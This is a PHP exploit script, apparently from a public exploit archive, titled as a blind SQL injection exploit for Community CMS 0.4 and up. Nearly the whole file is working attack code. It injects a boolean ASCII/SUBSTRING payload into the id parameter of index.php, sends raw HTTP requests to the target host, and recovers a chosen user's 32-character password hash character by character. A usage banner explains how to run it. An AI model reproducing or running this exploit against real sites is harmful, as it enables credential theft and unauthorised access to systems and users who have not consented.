&lt;?php

function query ($user, $pos, $chr)
{
	$query = &quot;x&#039; OR ASCII(SUBSTRING((SELECT password FROM comcms_users WHERE username = &#039;{$user}&#039;),{$pos},1))={$chr} OR &#039;1&#039; = &#039;2&quot;;
	$query = str_replace (&quot; &quot;, &quot;%20&quot;, $query);
	$query = str_replace (&quot;&#039;&quot;, &quot;%27&quot;, $query);

	return $query;
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$chr = ord ($chr);
	$fp = fsockopen ($hostname, 80);
	
	$query = query ($user, $pos, $chr);
	$get =  &quot;GET {$path}/index.php?id={$query} HTTP/1.1\r\n&quot;.
		&quot;Host: {$hostname}\r\n&quot;.
		&quot;Connection: Close\r\n\r\n&quot;;
	
	fputs ($fp, $get);

	while (!feof ($fp))
		$x .= fgets ($fp, 1024);
	
	fclose ($fp);
	
	if (preg_match (&quot;/Failed to load page/&quot;, $x))
		return false;
	else
		return true;
	
}

function usage () {
	exit (
		&quot;Community CMS &lt;= 0.4 Blind SQL Injection Exploit&quot;.
		&quot;\n[+] Author  : darkjoker&quot;.
		&quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Download: http://surfnet.dl.sourceforge.net/sourceforge/communitycms/communitycms-0.4.zip&quot;.
		&quot;\n[+] Usage   : php xpl.php &lt;localhost&gt; &lt;path&gt; &lt;username&gt;&quot;.
		&quot;\n[+] Ex.     : php xpl.php localhost /CommunityCMS admin&quot;.
		&quot;\n[+] Greetz  : certaindeath&quot;.
		&quot;\n\n&quot;);
}

if ($argc != 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = &quot;abcdef0123456789&quot;;
$pos = 1;
$chr = 0;

echo &quot;[+] Password: &quot;;

while ($pos &lt;= 32)
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}

echo &quot;\n\n&quot;;

?&gt;